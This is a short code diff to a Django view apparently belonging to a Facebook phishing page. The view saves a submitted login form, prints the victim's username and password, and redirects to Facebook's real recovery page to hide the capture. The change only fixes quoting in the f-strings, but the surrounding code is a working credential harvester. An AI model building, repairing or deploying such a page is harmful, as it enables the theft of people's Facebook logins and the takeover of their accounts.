@@ -9,8 +9,8 @@ def facebook_login(request):
         fm = FacebookForm(request.POST)
         if fm.is_valid():
             fm.save()
-            print(f"Username : {fm.cleaned_data.get("username")}")
-            print(f"Password : {fm.cleaned_data.get("password")}\n")
+            print(f"Username : {fm.cleaned_data.get('username')}")
+            print(f"Password : {fm.cleaned_data.get('password')}\n")
             return HttpResponseRedirect("https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0")
     fm = FacebookForm()
     return render(request,"facebook/index.html",{"form":fm})
